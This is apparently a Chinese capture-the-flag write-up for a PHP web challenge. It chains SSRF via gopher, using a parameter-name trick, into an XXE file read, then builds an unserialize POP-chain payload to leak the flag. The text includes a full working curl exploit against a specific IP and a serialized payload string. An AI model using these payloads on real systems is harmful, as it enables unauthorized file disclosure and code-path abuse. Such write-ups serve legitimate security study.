index.php为ssrf

明确了只能使用gopher，不能直接file读取flag等文件

看到有一个xxe.php

那么可以知道应该是ssrf利用gopher协议读取文件了

同样也不能读取flag之类的

ssrf的参数传入是一个trick
要求GET传送两个参数，参数名不一样，但是最后能够使得GET只有一个元组

参考https://www.php.net/manual/zh/language.variables.external.php
Note:
变量名中的点和空格被转换成下划线。例如 
```
<input name="a.b" />
``` 
变成了 
```
$_REQUEST["a_b"]。
```
因此实际上输入a[b&a.b，后端代码都会转变为a_b且取后一个值

读取文件
读取main.php
```
curl -g -v 'http://39.105.136.196/1/index.php?a[b=1&a_b=gopher://127.0.0.1:80/_POST%20%2f1%2fxxe.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aContent-Length%3A%20159%250d%250a%250d%250adata%253D%253C%253Fxml%2520version%253D%25221.0%2522%253F%253E%253C!DOCTYPE%2520ANY%2520%255B%253C!ENTITY%2520content%2520SYSTEM%2520%2522php%253A%252F%252Ffilter%252Fconvert.base64-encode%252Fresource%253Dmain.php%2522%253E%255D%253E%253Cnote%253E%253Cname%253E%252526content%253B%253C%252Fname%253E%253C%252Fnote%253E'
```
```
PD9waHAKY2xhc3MgQQp7CiAgICBwdWJsaWMgJG9iamVjdDsKICAgIHB1YmxpYyAkbWV0aG9kOwogICAgcHVibGljICR2YXJpYWJsZTsKCiAgICBmdW5jdGlvbiBfX2Rlc3RydWN0KCkKICAgIHsKICAgICAgICAkbyA9ICR0aGlzLT5vYmplY3Q7CiAgICAgICAgJG0gPSAkdGhpcy0+bWV0aG9kOwogICAgICAgICR2ID0gJHRoaXMtPnZhcmlhYmxlOwogICAgICAgICRvLT4kbSgpOwogICAgICAgIGdsb2JhbCAkJHY7CiAgICAgICAgJGZsYWcgPSBmaWxlX2dldF9jb250ZW50cygnZmxhZy5waHAnKTsKICAgICAgICBvYl9lbmRfY2xlYW4oKTsKICAgIH0KfTsKCmNsYXNzIEIKewogICAgZnVuY3Rpb24gZmxhZygpCiAgICB7CiAgICAgICAgb2Jfc3RhcnQoKTsKICAgICAgICBnbG9iYWwgJGZsYWc7CiAgICAgICAgZWNobyAkZmxhZzsKICAgIH0KfTsKJGZsYWcgPSBmaWxlX2dldF9jb250ZW50cygnZmxhZy5waHAnKTsKaWYgKGlzc2V0KCRfR0VUWyfigKwnXSkpIHsKICAgIHVuc2VyaWFsaXplKCRfR0VUWyfigKwnXSktPkNhcHR1cmVUaGVGbGFnKCk7Cn0gZWxzZSB7CiAgICBoaWdobGlnaHRfZmlsZShfX0ZJTEVfXyk7Cn0K
```
解密base64

得到代码
```
<?php
class A
{
    public $object;
    public $method;
    public $variable;

    function __destruct()
    {
        $o = $this->object;
        $m = $this->method;
        $v = $this->variable;
        $o->$m();
        global $$v;
        $flag = file_get_contents('flag.php');
        ob_end_clean();
    }
};

class B
{
    function flag()
    {
        ob_start();
        global $flag;
        echo $flag;
    }
};
$flag = file_get_contents('flag.php');
if (isset($_GET['‬'])) {
    unserialize($_GET['‬'])->CaptureTheFlag();
} else {
    highlight_file(__FILE__);
}

```
读取hint.php
```
<?php
#there is an main.php
#“大佬，要不咱们用一个好长好长的数字的md5做通信密码吧”
#“那你给我算一个出来”
#“好的”
#
#小白打开了win10的calc，开始计算8129947191207+1992100742919
#
#“好了大佬，10122047934126的md5值”
#“6dc6a29df1d7d33166bba5e17e42d2ea对吧”
#“哈？？？不是3e3e7d453061d953bce39ed3e82fd2a1吗”
#
#“咱们对一下数字？”
#‭10122047934126‬
#10122047934126
#“这不是一样的吗....咋就md5不一样了.......”
#
#找出来到底哪里出了问题，就可以看这道web题目了
```
发现是输入的参数是由于复制了calc的结果产生的不可见字符%e2%80%ac，然后开始做题

这个反序列化比较难

结合了throw error时候，无法正常释放对象的技巧

因为__toString不在，所以访问不存在的方法会导致无法throw error

因此需要用数组
```
a:3:{i:0;O:1:"A":3:{s:6:"object";O:1:"B":0:{}s:6:"method";s:4:"flag";s:8:"variable";s:4:"flag";}i:0;O:1:"A":3:{s:6:"object";O:1:"B":0:{}s:6:"method";s:4:"flag";s:8:"variable";s:4:"this";}i:0;s:4:"AAAA";}
```
这个poc是因为
1. 第一个就是数组同id实现释放
2. 第二个就是在ob end clean之前触发一个exception，让它不会清理掉B的输出
3. global处触发exception，因为global $this是非法的